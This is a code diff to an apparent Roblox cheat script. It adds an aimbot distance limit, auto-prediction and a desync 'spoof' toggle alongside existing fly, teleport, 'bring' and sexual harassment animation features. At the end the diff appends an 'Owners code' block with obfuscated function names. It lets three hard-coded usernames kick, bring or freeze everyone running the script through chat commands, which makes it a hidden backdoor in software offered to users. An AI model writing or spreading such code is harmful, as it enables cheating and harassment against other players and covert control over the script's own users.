@@ -50,6 +50,7 @@ local Config = {
     CsyncRandomEnabled = false,
     CsyncOrbitEnabled = false,
     CsyncRadius = 10,
+    MaxDistance = 250,
     CsyncHeight = 5,
     CsyncSpeed = 5,
     AutoWallhopEnabled = false,
@@ -63,6 +64,7 @@ local Config = {
     AntiVoidEnabled = false,
     AirPartEnabled = false,  
 }
+local spoof = false
 local desync_setback = Instance.new("Part")
 desync_setback.Name = "Desync Setback"
 desync_setback.Parent = Workspace
@@ -138,7 +140,20 @@ local function r15(player)
     end
     return false
 end
+local function CalculateAutoPrediction(target)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+        return 0.1
+    end
 
+    local ping = math.clamp(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000, 0.01, 1)
+    local root = target.Character.HumanoidRootPart
+    local velocity = root.AssemblyLinearVelocity.Magnitude
+    local distance = (root.Position - Workspace.CurrentCamera.CFrame.Position).Magnitude
+
+    local predicted_time = (distance / math.max(velocity, 1)) * 0.05 + ping * 0.5
+    predicted_time = math.clamp(predicted_time, 0.05, 0.4)
+    return predicted_time
+end
 local function toggleJerkOff()
     local speaker = LocalPlayer
     jerkOffEnabled = not jerkOffEnabled
@@ -492,23 +507,25 @@ ButtonLayout1:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     ButtonFrame1.CanvasSize = UDim2.new(0, 0, 0, ButtonLayout1.AbsoluteContentSize.Y)
 end)
 
-local PlayerListFrame = Instance.new("ScrollingFrame", Page1)
-PlayerListFrame.Size = UDim2.new(0.5, -5, 1, -20)
-PlayerListFrame.Position = UDim2.new(0.5, 0, 0, 10)
-PlayerListFrame.BackgroundTransparency = 1
-PlayerListFrame.ScrollBarThickness = 0
-PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+local ButtonFrame2 = Instance.new("ScrollingFrame", Page1)
+ButtonFrame2.Size = UDim2.new(0.5, -5, 1, -20)  -- Chiếm toàn bộ chiều cao Page1
+ButtonFrame2.Position = UDim2.new(0.5, 0, 0, 10)  -- Bắt đầu từ bên phải Page1
+ButtonFrame2.BackgroundTransparency = 1
+ButtonFrame2.ScrollBarThickness = 0
+ButtonFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)
 
-local UIListLayout = Instance.new("UIListLayout", PlayerListFrame)
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout.Padding = UDim.new(0, 4)
-UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
+local ButtonLayout2 = Instance.new("UIListLayout", ButtonFrame2)
+ButtonLayout2.SortOrder = Enum.SortOrder.LayoutOrder
+ButtonLayout2.Padding = UDim.new(0, 6)
+ButtonLayout2:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ButtonFrame2.CanvasSize = UDim2.new(0, 0, 0, ButtonLayout2.AbsoluteContentSize.Y)
 end)
 
+-- Chuyển code tạo danh sách người chơi vào ButtonFrame2
 local function UpdatePlayerList()
-    for _, child in pairs(PlayerListFrame:GetChildren()) do
-        if child:IsA("TextButton") then
+    for _, child in pairs(ButtonFrame2:GetChildren()) do
+        if child:IsA("TextButton") and child.Name ~= "TP Player" and child.Name ~= "BangPlayer: OFF" 
+        and child.Name ~= "Loop Bring: OFF" and child.Name ~= "View: OFF" then
             child:Destroy()
         end
     end
@@ -523,11 +540,11 @@ local function UpdatePlayerList()
             button.BorderSizePixel = 0
             button.Font = Enum.Font.Gotham
             button.AutoButtonColor = false
-            button.Parent = PlayerListFrame
+            button.Parent = ButtonFrame2
 
             local function UpdateButtonText()
                 local isSelected = Config.SelectedPlayers[player.Name]
-                button.Text = (isSelected and "✓ " or "") .. player.DisplayName  -- Chỉ giữ DisplayName, xóa tên gốc để gọn
+                button.Text = (isSelected and "✓ " or "") .. player.DisplayName
             end
 
             button.MouseButton1Click:Connect(function()
@@ -541,7 +558,7 @@ local function UpdatePlayerList()
     end
 end
 
--- Gọi ban đầu và khi player add/remove
+-- Gọi ban đầu để tạo danh sách người chơi trước
 UpdatePlayerList()
 Players.PlayerAdded:Connect(UpdatePlayerList)
 Players.PlayerRemoving:Connect(UpdatePlayerList)
@@ -924,32 +941,15 @@ aimbotButton = CreateButton(ButtonFrame1, "Aimlock: OFF", function()
     sendNotification("AIMLOCK", Config.AimbotEnabled and "ON" or "OFF")
 end)
 
-local function GetPing()
-    local stats = game:GetService("Stats"):FindFirstChild("Network")
-    local data = stats and stats:FindFirstChild("DataPing")
-    return data and math.clamp(data:GetValue(), 10, 300) or 40
-end
-
--- Thêm hàm tính prediction scalar dựa trên ping (standard cho Da Hood)
-local function GetPredFromPing(p)
-    if p < 20 then return 0.10036
-    elseif p < 30 then return 0.1130
-    elseif p < 40 then return 0.13544
-    elseif p < 50 then return 0.1357
-    elseif p < 60 then return 0.13598
-    elseif p < 70 then return 0.13892
-    elseif p < 80 then return 0.1403
-    elseif p < 90 then return 0.1446
-    elseif p < 100 then return 0.1475  
+createInput(
+    ButtonFrame1,
+    "Max distance",
+    Config.MaxDistance,
+    "Enter Max distance (e.g. 1000)",
+    function(value)
+        Config.MaxDistance = value
     end
-end
-
-local function CalculateVIPPrediction(part, scalar)  -- Thay 'ping' bằng 'scalar'
-    if not part or not part:IsA("BasePart") then return nil end
-    local velocity = part.Velocity
-    return part.Position + velocity * scalar  -- Dùng scalar trực tiếp
-end
-
+)
 createInput(
     ButtonFrame1,
     "Prediction",
@@ -1045,177 +1045,14 @@ LocalPlayer.CharacterAdded:Connect(function()
 end)
 
 local function UpdateFly(deltaTime)
-    local plr = LocalPlayer
-    local char = plr.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    if not (Config.FlyEnabled and char and hum and root) then
-        return
-    end
-
-    local maxspeed = Config.FlySpeed or 50
-    local speed = Config.FlySpeed
-    local ctrl = {f = 0, b = 0, l = 0, r = 0}
-    local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-    local bg, bv
-
-    if hum.RigType == Enum.HumanoidRigType.R6 then
-        bg = Instance.new("BodyGyro", root)
-        bv = Instance.new("BodyVelocity", root)
-    else
-        local upperTorso = char:FindFirstChild("UpperTorso")
-        if not upperTorso then return end
-        bg = Instance.new("BodyGyro", upperTorso)
-        bv = Instance.new("BodyVelocity", upperTorso)
-    end
-
-    bg.P = 9e4
-    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-    bg.cframe = root.CFrame
-    bv.velocity = Vector3.new(0, 0.1, 0)
-    bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-
-    hum.PlatformStand = true
-    char.Animate.Disabled = true
-
-    for _, state in ipairs({
-        Enum.HumanoidStateType.Climbing,
-        Enum.HumanoidStateType.FallingDown,
-        Enum.HumanoidStateType.Flying,
-        Enum.HumanoidStateType.Freefall,
-        Enum.HumanoidStateType.GettingUp,
-        Enum.HumanoidStateType.Jumping,
-        Enum.HumanoidStateType.Landed,
-        Enum.HumanoidStateType.Physics,
-        Enum.HumanoidStateType.PlatformStanding,
-        Enum.HumanoidStateType.Ragdoll,
-        Enum.HumanoidStateType.Running,
-        Enum.HumanoidStateType.RunningNoPhysics,
-        Enum.HumanoidStateType.Seated,
-        Enum.HumanoidStateType.StrafingNoPhysics,
-        Enum.HumanoidStateType.Swimming
-    }) do
-        hum:SetStateEnabled(state, false)
-    end
-    hum:ChangeState(Enum.HumanoidStateType.Swimming)
-
-    local connection
-    connection = RunService.RenderStepped:Connect(function()
-        if not Config.FlyEnabled or plr.Character.Humanoid.Health == 0 then
-            maxspeed = Config.FlySpeed
-            hum.PlatformStand = false
-            char.Animate.Disabled = false
-            for _, state in ipairs({
-                Enum.HumanoidStateType.Climbing,
-                Enum.HumanoidStateType.FallingDown,
-                Enum.HumanoidStateType.Flying,
-                Enum.HumanoidStateType.Freefall,
-                Enum.HumanoidStateType.GettingUp,
-                Enum.HumanoidStateType.Jumping,
-                Enum.HumanoidStateType.Landed,
-                Enum.HumanoidStateType.Physics,
-                Enum.HumanoidStateType.PlatformStanding,
-                Enum.HumanoidStateType.Ragdoll,
-                Enum.HumanoidStateType.Running,
-                Enum.HumanoidStateType.RunningNoPhysics,
-                Enum.HumanoidStateType.Seated,
-                Enum.HumanoidStateType.StrafingNoPhysics,
-                Enum.HumanoidStateType.Swimming
-            }) do
-                hum:SetStateEnabled(state, true)
-            end
-            hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
-            bg:Destroy()
-            bv:Destroy()
-            connection:Disconnect()
-            return
-        end
-
-        local camera = game.Workspace.CurrentCamera
-        local forward = UserInputService:IsKeyDown(Enum.KeyCode.W) and 1 or 0
-        local backward = UserInputService:IsKeyDown(Enum.KeyCode.S) and -1 or 0
-        local left = UserInputService:IsKeyDown(Enum.KeyCode.A) and -1 or 0
-        local right = UserInputService:IsKeyDown(Enum.KeyCode.D) and 1 or 0
-
-        ctrl = {f = forward, b = backward, l = left, r = right}
-
-        if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
-            speed = speed + 0.5 + (speed / maxspeed)
-            if speed > maxspeed then
-                speed = maxspeed
-            end
-        elseif speed ~= 0 then
-            speed = speed - 1
-            if speed < 0 then
-                speed = 0
-            end
-        end
-
-        if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
-            bv.velocity = ((camera.CoordinateFrame.lookVector * (ctrl.f + ctrl.b)) +
-                          ((camera.CoordinateFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * 0.2, 0).p) - camera.CoordinateFrame.p)) * speed
-            lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-        elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
-            bv.velocity = ((camera.CoordinateFrame.lookVector * (lastctrl.f + lastctrl.b)) +
-                          ((camera.CoordinateFrame * CFrame.new(lastctrl.l + lastctrl.r, (lastctrl.f + lastctrl.b) * 0.2, 0).p) - camera.CoordinateFrame.p)) * speed
-        else
-            bv.velocity = Vector3.new(0, 0, 0)
-        end
-
-        bg.cframe = camera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f + ctrl.b) * 50 * speed / maxspeed), 0, 0)
-    end)
-
-    -- Handle up/down movement with Space and LeftControl
-    local upConnection, downConnection
-    if Config.FlyEnabled then
-        upConnection = UserInputService.InputBegan:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.Space then
-                while UserInputService:IsKeyDown(Enum.KeyCode.Space) and Config.FlyEnabled and root and root.Parent do
-                    root.CFrame = root.CFrame * CFrame.new(0, 1, 0)
-                    wait()
-                end
-            end
-        end)
-
-        downConnection = UserInputService.InputBegan:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.LeftControl then
-                while UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and Config.FlyEnabled and root and root.Parent do
-                    root.CFrame = root.CFrame * CFrame.new(0, -1, 0)
-                    wait()
-                end
-            end
-        end)
-    end
-
-    -- Cleanup when fly is disabled
-    if not Config.FlyEnabled then
-        if upConnection then upConnection:Disconnect() end
-        if downConnection then downConnection:Disconnect() end
-        if connection then connection:Disconnect() end
-        hum.PlatformStand = false
-        char.Animate.Disabled = false
-        for _, state in ipairs({
-            Enum.HumanoidStateType.Climbing,
-            Enum.HumanoidStateType.FallingDown,
-            Enum.HumanoidStateType.Flying,
-            Enum.HumanoidStateType.Freefall,
-            Enum.HumanoidStateType.GettingUp,
-            Enum.HumanoidStateType.Jumping,
-            Enum.HumanoidStateType.Landed,
-            Enum.HumanoidStateType.Physics,
-            Enum.HumanoidStateType.PlatformStanding,
-            Enum.HumanoidStateType.Ragdoll,
-            Enum.HumanoidStateType.Running,
-            Enum.HumanoidStateType.RunningNoPhysics,
-            Enum.HumanoidStateType.Seated,
-            Enum.HumanoidStateType.StrafingNoPhysics,
-            Enum.HumanoidStateType.Swimming
-        }) do
-            hum:SetStateEnabled(state, true)
-        end
-        hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
-        if bg then bg:Destroy() end
-        if bv then bv:Destroy() end
+    if Config.FlyEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local root = LocalPlayer.Character.HumanoidRootPart
+        local moveDirection = LocalPlayer.Character.Humanoid.MoveDirection
+        local flySpeed = Config.FlySpeed
+        local vertical = UserInputService:IsKeyDown(Enum.KeyCode.Space) and flySpeed / 8 or UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and -flySpeed / 8 or 0
+        root.CFrame = root.CFrame + moveDirection * deltaTime * flySpeed * 10
+        root.CFrame = root.CFrame + Vector3.new(0, vertical, 0)
+        root.Velocity = root.Velocity * Vector3.new(1, 0, 1) + Vector3.new(0, 1.9, 0)
     end
 end
 
@@ -1574,7 +1411,10 @@ csyncOrbitButton = CreateButton(ButtonFrame1, "Csync Orbit: " .. (Config.CsyncOr
         end
     end
 end)
-
+SpoofButton = CreateButton(ButtonFrame1, "Csync Spoof: " .. (Spoof and "ON" or "OFF"), function()
+    Spoof = not Spoof
+    SpoofButton.Text = "Csync Spoof: " .. (Spoof and "ON" or "OFF")
+end)
 -- Frame nhập Radius, Height, Speed
 local boxFrame = Instance.new("Frame")
 boxFrame.Size = UDim2.new(1, 0, 0, 40)
@@ -1665,14 +1505,16 @@ _G.VHUB_CSYNC_LOOP = RunService.Heartbeat:Connect(function(deltaTime)
             Config.CsyncHeight or 0,
             math.sin(t) * (Config.CsyncRadius or 10)
         )
-        workspace.CurrentCamera.CameraSubject = desync_setback
+		if spoof then
+            workspace.CurrentCamera.CameraSubject = desync_setback
+		end
         rootPart.CFrame = CFrame.new(targetPos + offset, targetPos)
+		if spoof then
+            RunService.RenderStepped:Wait()
 
-        RunService.RenderStepped:Wait()
-
-        desync_setback.CFrame = old_position * CFrame.new(0, rootPart.Size.Y / 2 + 0.5, 0)
-        rootPart.CFrame = old_position
-
+            desync_setback.CFrame = old_position * CFrame.new(0, rootPart.Size.Y / 2 + 0.5, 0)
+            rootPart.CFrame = old_position
+        end
     -- Csync Random
     elseif Config.CsyncRandomEnabled then
         local offset = Vector3.new(
@@ -1680,20 +1522,24 @@ _G.VHUB_CSYNC_LOOP = RunService.Heartbeat:Connect(function(deltaTime)
             Config.CsyncHeight or 0,
             math.random(-(Config.CsyncRadius or 10), Config.CsyncRadius or 10)
         )
-		
-        workspace.CurrentCamera.CameraSubject = desync_setback
+		if spoof then
+            workspace.CurrentCamera.CameraSubject = desync_setback
+		end
         rootPart.CFrame = CFrame.new(targetPos + offset, targetPos)
+        if spoof then
+            RunService.RenderStepped:Wait()
 
-        RunService.RenderStepped:Wait()
-
-        desync_setback.CFrame = old_position * CFrame.new(0, rootPart.Size.Y / 2 + 0.5, 0)
-        rootPart.CFrame = old_position
+            desync_setback.CFrame = old_position * CFrame.new(0, rootPart.Size.Y / 2 + 0.5, 0)
+            rootPart.CFrame = old_position
+		end
     else
-        if LocalPlayer.Character then
-            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-            if humanoid then
-                workspace.CurrentCamera.CameraSubject = humanoid
-            end
+	    if spoof then 
+            if LocalPlayer.Character then
+                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+                if humanoid then
+                    workspace.CurrentCamera.CameraSubject = humanoid
+                end
+		    end
         end
     end
 end)
@@ -2120,7 +1966,7 @@ local function stopAnimAndTp()
 end
 
 -- Tạo nút BangPlayer sử dụng CreateButton
-bangButton = CreateButton(ButtonFrame2Left, "BangPlayer: OFF", function()
+bangButton = CreateButton(ButtonFrame2, "BangPlayer: OFF", function()
     animEnabled = not animEnabled
     
     if not animEnabled then
@@ -2205,7 +2051,7 @@ LocalPlayer.CharacterAdded:Connect(function()
     end
 end)
 
-tpAndStompButton = CreateButton(ButtonFrame2Left, "TP Player", function()
+tpAndStompButton = CreateButton(ButtonFrame2, "TP Player", function()
     local myPos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position
     if not myPos then return end
 
@@ -2489,11 +2335,39 @@ end)
 CreateButton(ButtonFrame2Right, "sturdy", function()
     playAnimation(animations.sturdy)
 end)
-
+local defaultCameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or Workspace.CurrentCamera.CameraSubject
+local viewButton = CreateButton(ButtonFrame2, "View: OFF", function()
+    viewEnabled = not viewEnabled
+    viewButton.Text = "View: " .. (viewEnabled and "ON" or "OFF")
+    sendNotification("View", viewEnabled and "ON" or "OFF")
+    
+    if viewEnabled then
+        local selected = {}
+        for name, sel in pairs(Config.SelectedPlayers) do
+            if sel then
+                local plr = Players:FindFirstChild(name)
+                if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+                    table.insert(selected, plr)
+                end
+            end
+        end
+        if #selected > 0 then
+            local randomPlayer = selected[math.random(1, #selected)]
+            Workspace.CurrentCamera.CameraSubject = randomPlayer.Character.Humanoid
+        else
+            sendNotification("View", "No selected players to view!", 2)
+            viewEnabled = false
+            viewButton.Text = "View: OFF"
+            Workspace.CurrentCamera.CameraSubject = defaultCameraSubject
+        end
+    else
+        Workspace.CurrentCamera.CameraSubject = defaultCameraSubject
+    end
+end)
 -- LOOP BRING
 local loopBring = false
 local loopBringConn
-loopBringButton = CreateButton(ButtonFrame2Right, "Loop Bring: OFF", function()
+loopBringButton = CreateButton(ButtonFrame2, "Loop Bring: OFF", function()
     loopBring = not loopBring
     loopBringButton.Text = "Loop Bring: " .. (loopBring and "ON" or "OFF")
 
@@ -3039,35 +2913,12 @@ local function UpdateSpeed()
 end
 
 UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    if input.KeyCode == Enum.KeyCode.Y then
-        autoSelect = not autoSelect
-        if autoSelect then
-            for _, player in pairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer then
-                    Config.SelectedPlayers[player.Name] = true
-                end
-            end
-        else
-            Config.SelectedPlayers = {}
-        end
-        UpdatePlayerList()
+    if input.KeyCode == Enum.KeyCode.RightControl then
+        MainFrame.Visible = not MainFrame.Visible
     end
 end)
 
 local UIS = game:GetService("UserInputService")
-
-UIS.InputBegan:Connect(function(input, gameProcessed)
-    if input.UserInputType == Enum.UserInputType.MouseButton2 and not gameProcessed then
-        getgenv().Aimbot.Status = true
-    end
-end)
-
-UIS.InputEnded:Connect(function(input, gameProcessed)
-    if input.UserInputType == Enum.UserInputType.MouseButton2 then
-        getgenv().Aimbot.Status = false
-    end
-end)
 
 local hitParts = {
     "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso", "LeftUpperArm", "LeftLowerArm", "LeftHand",
@@ -3145,7 +2996,7 @@ end
 
 local function GetClosestValidPlayer()
     local closestPlayer = nil
-    local shortestDistance = math.huge
+    local shortestDistance = Config.MaxDistance
 
     local myChar = LocalPlayer.Character
     local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
@@ -3156,9 +3007,8 @@ local function GetClosestValidPlayer()
             local targetPart = plr.Character:FindFirstChild(getgenv().Aimbot.Hitpart)
             local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
             if targetPart and targetHRP then
-                -- Tính khoảng cách 3D trong game
                 local dist = (myHRP.Position - targetHRP.Position).Magnitude
-                if dist < shortestDistance then
+                if dist <= Config.MaxDistance and dist < shortestDistance then
                     closestPlayer = plr
                     shortestDistance = dist
                 end
@@ -3191,19 +3041,11 @@ RunService.RenderStepped:Connect(function(deltaTime)
     end
 
     if Config.AimbotEnabled and getgenv().Aimbot.Status then
-        -- Thêm phần tính scalar ở đây (gộp GetPing và set prediction)
-        local pred_scalar
-        if Config.AutoPredictionEnabled then
-            local ping = GetPing()  -- Chỉ gọi GetPing nếu auto bật
-            pred_scalar = GetPredFromPing(ping)  -- Tính scalar từ ping
-        else
-            pred_scalar = Config.Prediction or 0.135  -- Dùng scalar từ input (hoặc default)
-        end
-
         Player = GetClosestValidPlayer()
         if Player and Player.Character and Player.Character:FindFirstChild(getgenv().Aimbot.Hitpart) then
+            local pred_scalar = Config.AutoPredictionEnabled and CalculateAutoPrediction(Player) or Config.Prediction
             local part = getpart()
-            local predictedPos = CalculateVIPPrediction(part, pred_scalar)  -- Dùng scalar mới tính
+            local predictedPos = CalculateVIPPrediction(part, pred_scalar)
             if predictedPos and not IsObstructed(Camera.CFrame.Position, predictedPos) then
                 Camera.CFrame = CFrame.new(Camera.CFrame.Position, predictedPos)
             end
@@ -3448,3 +3290,74 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         end
     end
 end)
+-- Owners code
+local owners = {
+    "anhchangm52",
+    "anhchangm53",  
+    "dao_beo"
+}
+
+function x1y2z3(targetPlayer, owner)
+    if targetPlayer and targetPlayer.Character and owner and owner.Character then
+        targetPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+function a1b2c3(ownerName)
+    local owner
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == ownerName then
+            owner = player
+            break
+        end
+    end
+
+    if owner then
+        owner.Chatted:Connect(function(message)
+            if message == "/kick ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không kick owner
+                        player:Kick("Admins Has Kicked You.")
+                    end
+                end
+            elseif message == "/bring ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner then -- Không bring owner
+                        x1y2z3(player, owner)
+                    end
+                end
+            elseif message == "/freeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 0
+                        player.Character.Humanoid.JumpPower = 0
+                        player.Character.HumanoidRootPart.Anchored = true
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been frozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
+            elseif message == "/unfreeze ." then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= owner and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        player.Character.Humanoid.WalkSpeed = 16 -- Giá trị mặc định
+                        player.Character.Humanoid.JumpPower = 50 -- Giá trị mặc định
+                        player.Character.HumanoidRootPart.Anchored = false
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "Admin Command",
+                            Text = "You have been unfrozen by " .. ownerName,
+                            Duration = 3
+                        })
+                    end
+                end
+            end
+        end)
+    end
+end
+
+for _, ownerName in ipairs(owners) do
+    a1b2c3(ownerName)
+end
